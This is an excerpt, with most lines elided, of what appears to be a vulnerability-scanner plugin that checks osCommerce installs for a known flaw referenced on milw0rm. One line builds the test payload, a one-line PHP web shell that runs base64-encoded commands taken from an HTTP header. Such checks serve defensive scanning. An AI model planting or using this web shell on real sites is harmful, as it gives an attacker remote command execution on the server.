...
if (description)
{
  ...
  script_xref(name:"milw0rm", value:"9556");
...
operates."
  ...
  script_set_attribute(
    attribute:"see_also", 
    value:"http://forums.oscommerce.com/index.php?showtopic=343958"
  );
  script_set_attribute(
    attribute:"solution", 
    value:
...
exploit = string(
  ...
  "<?php passthru(base64_decode($_SERVER[HTTP_", var, "])); ?>\n"
);
...
exit(0, "The osCommerce install at "+build_url(port:port, qs:dir+"/")+" is not affected.");
